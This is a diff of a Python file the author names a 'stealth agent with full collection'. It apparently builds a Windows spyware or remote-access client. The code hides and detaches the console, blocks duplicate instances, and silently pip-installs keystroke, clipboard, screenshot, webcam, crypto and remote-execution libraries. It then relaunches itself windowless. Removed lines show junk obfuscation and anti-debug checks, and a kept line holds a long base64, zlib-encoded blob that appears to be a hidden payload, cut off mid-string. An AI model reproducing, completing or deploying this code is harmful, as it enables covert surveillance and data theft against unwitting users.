@@ -1,49 +1,1897 @@
+# -*- coding: utf-8 -*-
+# client.pyw - Agent furtif avec collecte complète
 
-def uIhvFmMj():
-    for _ in range(3):
-        pass
-    return True
-
-pzwaAphX = 'OrpJwGXOToGDfCKcMRsa'
-IZCmaWbo = 'zEBylgJPnWNQOtGhnRSA'
-FkJoiPjt = 'pzforhVJgEOIcqcAzMZD'
-QMVlDSUb = 'wUBhPulvTTvDoZBKGvgr'
-jYkInPRc = 'znLKipBSfrcmhgMNeQep'
-AlFfFxzm = 'UxOHpMfVxNNAHPZDTBNc'
-FBTBLXrY = 'xRdKbxcHiLUSVDULrOEG'
-jOKCwWkY = 'CCArecTEGNBAAwQMxPyv'
-
-def CyBpOzFs():
-    for _ in range(5):
-        pass
-    return None
-
-
+# ========== ANTI-CONSOLE ABSOLU (copié depuis GithubTest) ==========
 import sys
-import traceback
+import os
 
-def _check_debug():
-    """Vérifications anti-debug basiques"""
+if sys.platform == 'win32':
     try:
-        # Vérification du module traceback en debug
-        if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
-            print("Erreur d'exécution")
-            sys.exit(1)
+        import ctypes
         
-        # Vérification des breakpoints
-        if hasattr(sys, 'breakpointhook'):
-            print("Erreur d'exécution")
-            sys.exit(1)
-            
+        # Cacher la console immédiatement
+        console = ctypes.windll.kernel32.GetConsoleWindow()
+        if console:
+            ctypes.windll.user32.ShowWindow(console, 0)
+        
+        # Détacher complètement de la console
+        ctypes.windll.kernel32.FreeConsole()
+        
     except:
         pass
 
-_check_debug()
+# Rediriger stdout/stderr
+sys.stdout = open(os.devnull, 'w')
+sys.stderr = open(os.devnull, 'w')
 
+# ========== VÉRIFICATION ANTI-DOUBLON ==========
+try:
+    import psutil
+    current_pid = os.getpid()
+    current_script = os.path.basename(__file__).lower()
+    
+    for proc in psutil.process_iter(['pid', 'cmdline']):
+        try:
+            if proc.info['pid'] == current_pid:
+                continue
+            cmdline = proc.info.get('cmdline') or []
+            cmd_str = ' '.join(cmdline).lower()
+            if current_script in cmd_str:
+                sys.exit(0)
+        except (psutil.NoSuchProcess, psutil.AccessDenied):
+            continue
+except ImportError:
+    pass
+
+# ========== PHASE 1 : IMPORTS MINIMAUX POUR INSTALLATION ==========
+import subprocess
+import importlib
+import importlib.metadata
+
+REQUIRED_PACKAGES = [
+    'requests',
+    'psutil',
+    'pywin32',
+    'pyperclip',
+    'keyboard',
+    'mss',
+    'pycryptodome',
+    'pypsexec',
+    'websocket-client',
+    'opencv-python',
+    'pillow'
+]
+
+def install_package(package):
+    try:
+        subprocess.check_call(
+            [sys.executable, '-m', 'pip', 'install', '--quiet', '--no-warn-script-location', package],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            stdin=subprocess.DEVNULL,
+            creationflags=0x08000000
+        )
+        return True
+    except:
+        return False
+
+def check_and_install_dependencies():
+    missing = []
+    for pkg in REQUIRED_PACKAGES:
+        pkg_import = pkg.replace('-', '_').replace('opencv-python', 'cv2').replace('pillow', 'PIL')
+        if pkg == 'pywin32':
+            try:
+                import win32api
+            except ImportError:
+                missing.append(pkg)
+        elif pkg == 'pycryptodome':
+            try:
+                from Crypto.Cipher import AES
+            except ImportError:
+                missing.append(pkg)
+        elif pkg == 'opencv-python':
+            try:
+                import cv2
+            except ImportError:
+                missing.append(pkg)
+        elif pkg == 'pillow':
+            try:
+                from PIL import Image
+            except ImportError:
+                missing.append(pkg)
+        else:
+            try:
+                importlib.metadata.version(pkg_import)
+            except (ImportError, importlib.metadata.PackageNotFoundError):
+                missing.append(pkg)
+    
+    if missing:
+        for pkg in missing:
+            install_package(pkg)
+        
+        # Redémarrer avec pythonw.exe SANS CONSOLE
+        pythonw_path = sys.executable
+        if not pythonw_path.lower().endswith('pythonw.exe'):
+            alt_path = os.path.join(os.path.dirname(sys.executable), 'pythonw.exe')
+            if os.path.exists(alt_path):
+                pythonw_path = alt_path
+        
+        subprocess.Popen(
+            [pythonw_path] + sys.argv,
+            creationflags=0x08000000,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            stdin=subprocess.DEVNULL,
+            close_fds=True,
+            shell=False
+        )
+        sys.exit(0)
+
+check_and_install_dependencies()
+
+# ========== PHASE 2 : TOUS LES AUTRES IMPORTS ==========
+import json
 import base64
-import marshal
-import zlib
-aGguVubQ = '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